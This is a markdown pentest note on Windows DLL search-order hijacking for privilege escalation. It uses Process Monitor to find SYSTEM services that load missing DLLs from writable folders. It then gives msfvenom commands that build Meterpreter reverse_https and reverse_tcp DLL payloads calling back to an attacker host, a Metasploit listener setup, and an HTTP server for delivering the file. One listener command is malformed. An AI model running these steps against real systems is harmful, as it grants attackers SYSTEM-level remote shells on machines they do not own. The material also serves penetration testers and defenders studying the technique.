# DLL Search Order
1) Directory from which application launched
2) C:\Windows\System32
3) C:\Windows\System
4) C:\Windows
5) Current directory
6) Directories specified in the environment %PATH% variable.

# Steps To Execute with Process Explorer
1) Run [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer) as administrator.
2) To the Process Image grid, add the User Name column.
3) Look for processes running as NT AUTHORITY\SYSTEM.
4) Double-click on process.
5) Make note of image path and the service, listed under Services tab.
6) Run [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) as administrator.
7) Create a filter for a specific EXE to investigate (Process Name is [Process.exe] identified in Process Explorer).
8) Find service in Windows Services.
9) Confirm the service runs as Local System, under Log On.
10) Stop and start service, while watching it in Process Monitor.
11) Stop capture.
12) Create a filter for NAME NOT FOUND, for the Result column.
13) Look for instances that the application is looking for a DLL in a directory for which we have write permissions.
14) Create reverse_https, Meterpreter payload, with msfvenom. ```msfvenom -p windows/meterpreter/reverse_https LHOST=[Attack Host] LPORT=443 -f dll -o [DLL found in previous step]```
15) Copy payload, matching name and path identified in the prior step.
16) Restart service.
17) In Process Explorer, the selected service spawned a rundll32.exe process, running as SYSTEM, and is the process establishing the reverse shell.
18) Double-click on rundll32.exe and the connection will show in the TCP/IP tab.
19) **NOTE** Metasploit has a module for this attack:  windows/local/srclient_dll_hijacking.

# Steps To Execute without Process Explorer
1) Run [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) as administrator.
2) Create filters:
    1) Operation Includes Is "CreateFile." 
    2) Result Includes Is "NAME NOT FOUND." 
    3) Path Includes Ends With ".dll."
    4) Unselect "Show Registry Activity."
    5) Unselect "Show Network Activity."
3) Identify DLL.
4) Check for write permission to directory.
```powershell
Get-ACL '[Path Only to DLL]' | Format-List
```
5) Create a payload adn listener.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Attack Host] LPORT=4444 -f dll > [DLL Filename]

msfconsole
use exploit/use multi/handler
set lhost eth1
set payload windows/meterpreter/reverse_tcp
run
```
6) Copy to Target with low permission user. ```python -m SimpleHTTPServer 80```
7) Start application with escalated permission user.


# References
##### [Dynamic-Link Library Search Order](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN)
##### [Secure loading of libraries to prevent DLL preloading attacks](https://support.microsoft.com/en-us/topic/secure-loading-of-libraries-to-prevent-dll-preloading-attacks-d41303ec-0748-9211-f317-2edc819682e1)